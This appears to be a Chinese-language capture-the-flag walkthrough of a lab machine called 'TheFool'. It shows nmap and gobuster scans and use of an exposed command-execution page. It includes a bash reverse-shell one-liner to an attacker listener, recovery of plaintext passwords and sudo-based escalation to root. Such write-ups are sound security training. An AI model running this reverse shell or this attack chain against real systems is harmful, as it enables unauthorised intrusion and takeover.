# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 07:06 EDT
Nmap scan report for 192.168.21.8
Host is up (0.00024s latency).
MAC Address: 08:00:27:A5:2C:80 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.11
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 6.22 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.21.8
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 07:09 EDT
Nmap scan report for 192.168.21.8
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1a:a0:d3:56:90:49:44:38:a6:2b:83:e1:b9:34:9f:44 (ECDSA)
|_  256 43:4f:e0:21:f5:8f:00:06:a6:31:9f:bd:8a:b9:cf:96 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: \xE6\x84\x9A\xE8\x80\x85 | \xE5\xA1\x94\xE7\xBD\x97\xE7\x89\x8C\xE7\x9A\x84\xE6\x97\x85\xE7\xA8\x8B
MAC Address: 08:00:27:A5:2C:80 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.40 ms 192.168.21.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.94 seconds
```

# 漏洞利用

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt -u http://192.168.21.8
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.8
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 27877]
/image                (Status: 301) [Size: 312] [--> http://192.168.21.8/image/]                                                          
/info.php             (Status: 200) [Size: 80306]
/shell.php            (Status: 200) [Size: 3001]
/snapshots            (Status: 301) [Size: 316] [--> http://192.168.21.8/snapshots/]                                                      
/snapshot.php         (Status: 200) [Size: 2724]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/%7enews              (Status: 403) [Size: 277]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
Progress: 4741016 / 4741020 (100.00%)
===============================================================
Finished
===============================================================
```

/shell.php是一个命令执行页面

<img width="691" height="430" alt="图片" src="https://github.com/user-attachments/assets/289bd861-9a92-4c4d-8028-2e292d824534" />

反弹一个shell：bash -c "bash -i > /dev/tcp/192.168.21.11/1234 0>&1 2>&1"

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.21.11] from (UNKNOWN) [192.168.21.8] 50202
bash: cannot set terminal process group (860): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheFool:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

```
www-data@TheFool:/home/Elaina$ cat note.txt
cat note.txt
passwd
小写+2024
https://www.dcode.fr/chiffre-tueur-zodiac
www-data@TheFool:/home/Elaina/TravelDiary$ ls -la
ls -la
total 64
drwxr-xr-x 3 Elaina Elaina  4096 Sep 23 15:00 .
drwxr-xr-x 4 Elaina Elaina  4096 Sep 23 15:00 ..
-rw-r--r-- 1 Elaina Elaina 24432 Sep 23 06:22 Elinae.jpg
-rwx------ 1 root   root    2942 Sep 23 04:58 diary.sh
drwxr-xr-x 2 Elaina Elaina  4096 Sep 23 06:28 font
-rw-r--r-- 1 Elaina Elaina  2868 Sep 23 15:00 index.php
-rw-r--r-- 1 Elaina Elaina 12602 Sep 23 06:22 jlgl.jpg
-rw-rw-r-- 1 Elaina Elaina  2522 Sep 23 06:39 passwd.webp
```

index.php中有了账号密码：Elaina:Ashenwitch1501017

```
www-data@TheFool:/home/Elaina/TravelDiary$ su - Elaina
su - Elaina
Password: Ashenwitch1501017
id
uid=1000(Elaina) gid=1000(Elaina) groups=1000(Elaina)
```

看一下如何哪里可以提权

```
Elaina@TheFool:~$ sudo -l
sudo -l
Matching Defaults entries for Elaina on TheFool:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User Elaina may run the following commands on TheFool:
    (ALL) NOPASSWD: /home/Elaina/TravelDiary/diary.sh
Elaina@TheFool:~/TravelDiary$ sudo diary.sh
sudo diary.sh
[sudo] password for Elaina: 
```

需要密码，也有相关提示：note.txt和passwd.webp

```
Elaina@TheFool:~$ cat note.txt
cat note.txt
passwd
小写+2024
https://www.dcode.fr/chiffre-tueur-zodiac
```

根据提示里的网址进行解密

png

```
Elaina@TheFool:~/TravelDiary$ sudo ./diary.sh wanderlust2024
Travel Journal - Public Content
----------------------------------------
Travel Journal - Public Entries:

July 3rd:
Started my journey in a charming coastal town. The morning breeze carried the scent of saltwater and fresh bakery goods. Spent the day walking along the boardwalk and watching fishing boats return to harbor.

July 7th:
Took a day trip to explore nearby woodlands. The trails were well-marked and led through groves of oak and maple trees. Saw several species of birds and even a small deer that darted across the path.

July 10th:
Visited the central market in town. Vendors sold fresh produce, handmade crafts, and local specialties. Tried a traditional pastry that was sweet and flaky, with a filling of local berries.

July 14th:
Spent the morning at the town museum learning about the area's history. In the afternoon, sat in a park and sketched the old church with its distinctive spire.

Access Granted - Displaying Hidden Content
----------------------------------------

--- Hidden Entries (Protected Content) ---

root:r0o!Tt
























July 4th:
Met a fascinating stranger at the waterfront café who shared stories of sailing across the Atlantic. They showed me photographs of remote islands I'd never heard of - made me want to plan a longer voyage.

July 8th:
Discovered a hidden waterfall off the main trail. The pool at the base was crystal clear, and I couldn't resist taking a quick swim despite the cold temperature. No one else around for miles.

July 12th:
Found an old bookstore in a back alley. The owner showed me a first edition of a travel book from the 1800s. We talked for hours about forgotten explorers and their adventures. He gave me a rare map as a gift.

July 15th:
Secretly extended my trip by three days. Booked a room at a small inn in the countryside. Sometimes the best travel experiences happen when you abandon your original plans.
Elaina@TheFool:~/TravelDiary$ su root
Password: 
root@TheFool:/home/Elaina/TravelDiary# id
uid=0(root) gid=0(root) groups=0(root)
```
